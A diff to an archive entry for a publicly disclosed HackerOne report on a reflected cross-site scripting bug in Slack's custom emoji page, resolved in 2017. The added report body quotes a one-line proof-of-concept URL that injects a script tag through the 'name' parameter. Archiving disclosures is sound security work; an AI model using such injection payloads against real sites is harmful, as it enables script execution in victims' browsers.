@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Cross-site Scripting (XSS) - Reflected"
 enriched: true
+body: true
 date: 2017-09-24
 submitted: 2017-08-09T09:03:33.645Z
 bounty_usd: null
@@ -25,6 +26,15 @@ title: "The Custom Emoji Page has a Reflected XSS"
 - Report: [https://hackerone.com/reports/258198](https://hackerone.com/reports/258198)
 - CWE: Cross-site Scripting (XSS) - Reflected
 - Submitted: 2017-08-09T09:03:33.645Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+The Custom Emoji Page has a Reflected XSS in building flash message.
+
+The following is the PoC.
+https://{team}.slack.com/customize/emoji?added=1&name=vuln"><script>alert(0);<%2Fscript>
 
 ## Timeline
 
